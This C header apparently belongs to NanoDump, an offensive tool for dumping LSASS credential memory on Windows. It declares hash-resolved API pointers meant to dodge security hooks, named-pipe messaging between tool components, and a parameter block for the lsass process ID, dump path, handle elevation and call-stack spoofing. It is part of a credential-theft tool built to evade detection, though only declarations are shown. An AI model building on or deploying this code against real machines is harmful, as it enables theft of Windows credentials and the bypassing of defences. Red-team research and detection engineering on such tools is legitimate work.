#pragma once

#if defined(PPL_MEDIC) || defined(SSP)

#include "dinvoke.h"

typedef BOOL(WINAPI* InitializeSecurityDescriptor_t)(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
typedef BOOL(WINAPI* ConvertStringSecurityDescriptorToSecurityDescriptorW_t)(LPCWSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);
typedef HANDLE(WINAPI* CreateNamedPipeW_t)(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef HANDLE(WINAPI* CreateFileW_t)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL(WINAPI* ConnectNamedPipe_t)(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
typedef BOOL(WINAPI* WriteFile_t)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef BOOL(WINAPI* ReadFile_t)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
typedef BOOL(WINAPI* DisconnectNamedPipe_t)(HANDLE hNamedPipe);

#define InitializeSecurityDescriptor_SW2_HASH                         0x0388211D
#define ConvertStringSecurityDescriptorToSecurityDescriptorW_SW2_HASH 0x1693E886
#define CreateNamedPipeW_SW2_HASH                                     0x58993B44
#define CreateFileW_SW2_HASH                                          0x24976EA4
#define ConnectNamedPipe_SW2_HASH                                     0x96019466
#define WriteFile_SW2_HASH                                            0xED7C1B6F
#define ReadFile_SW2_HASH                                             0x8D38978F
#define DisconnectNamedPipe_SW2_HASH                                  0xAEA47AEA

#define SDDL_REVISION_1 1
#define PAGE_SIZE 0x1000

typedef enum MESSAGE_TYPE
{
    parameters,
} MESSAGE_TYPE;

typedef struct _MSG_PPL_MEDIC_PARAMETERS
{
    DWORD lsass_pid;
    LPSTR dump_path[MAX_PATH + 1];
    BOOL  use_valid_sig;
    BOOL  duplicate_handle;
    BOOL  elevate_handle;
    BOOL  duplicate_elevate;
    DWORD spoof_callstack;
} MSG_PPL_MEDIC_PARAMETERS, * PMSG_PPL_MEDIC_PARAMETERS;

typedef struct _IPC_MSG
{
    MESSAGE_TYPE Type;
    union {
        MSG_PPL_MEDIC_PARAMETERS Params;
    } p;

} IPC_MSG, * PIPC_MSG;

#if defined(PPL_MEDIC)

#define IPC_PIPE_NAME L"NanoDumpPPLmedicPipe"

#endif // #if defined(PPL_MEDIC)

BOOL create_named_pipe(
    IN LPCWSTR pipe_name,
    IN BOOL async,
    OUT PHANDLE hPipe);

BOOL connect_to_named_pipe(
    IN LPWSTR pipe_name,
    OUT PHANDLE hPipe);

BOOL listen_on_named_pipe(
    IN HANDLE hPipe);

BOOL recv_arguments_from_pipe(
    IN HANDLE hPipe,
    OUT PDWORD lsass_pid,
    OUT LPSTR* dump_path,
    OUT PBOOL use_valid_sig,
    OUT PBOOL duplicate_handle,
    OUT PBOOL elevate_handle,
    OUT PBOOL duplicate_elevate,
    OUT PDWORD spoof_callstack);

BOOL send_arguments_from_pipe(
    OUT PHANDLE hPipe,
    IN DWORD lsass_pid,
    IN LPSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL duplicate_handle,
    IN BOOL elevate_handle,
    IN BOOL duplicate_elevate,
    IN DWORD spoof_callstack);

BOOL disconnect_pipe(
    IN HANDLE hPipe);

#endif // #if defined(PPL_MEDIC) || defined(SSP)
